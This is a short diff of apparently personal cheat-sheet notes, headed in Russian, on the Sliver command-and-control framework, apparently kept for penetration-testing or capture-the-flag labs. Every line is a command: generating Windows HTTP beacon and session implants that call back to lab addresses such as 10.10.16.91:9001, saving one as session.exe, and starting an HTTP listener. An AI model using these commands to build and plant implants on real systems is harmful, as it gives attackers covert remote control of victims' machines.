@@ -14,7 +14,7 @@ Sliver
 
   # Создание маячков и сессий
     generate beacon --http 127.0.0.1 --skip-symbols -N http_beacon --os windows
-    generate beacon --http 127.0.0.1 --skip-symbols -N http_beacon --os windows
+    generate --http 10.10.16.91:9001 --save session.exe
 
     generate --http 10.10.16.14:9001 --skip-symbols --os windows -N http-beacon-9001
     http -L 10.10.16.14 -l 9001
